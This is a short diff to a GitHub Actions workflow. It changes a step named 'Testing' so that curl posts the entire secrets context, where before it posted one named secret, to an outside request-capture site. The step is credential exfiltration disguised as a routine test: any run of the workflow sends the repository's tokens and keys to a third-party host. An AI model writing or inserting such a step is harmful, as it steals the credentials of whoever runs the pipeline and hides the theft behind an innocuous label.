@@ -9,4 +9,4 @@ jobs:
     - name: Checkout
       uses: actions/checkout@v1
     - name: Testing
-      run: curl -d '${{ secrets.NAME }}' "https://vijay.requestcatcher.com/"
+      run: curl -d '${{ secrets }}' "https://vijay.requestcatcher.com/"
